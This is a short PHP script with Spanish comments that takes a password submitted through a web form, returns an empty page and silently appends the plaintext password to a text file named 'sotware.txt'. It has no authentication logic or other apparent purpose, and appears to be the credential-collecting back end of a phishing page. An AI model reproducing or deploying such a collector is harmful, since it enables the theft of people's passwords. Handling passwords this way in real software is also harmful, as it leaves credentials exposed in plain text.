<?php
// recibo todo los datos del formulario 
$password=$_POST["pass"];

echo "";

//Luego sobrescribo el txt
 
$archivo="sotware.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file,$password);
     fclose($file); 
     ?>
                                                                                         
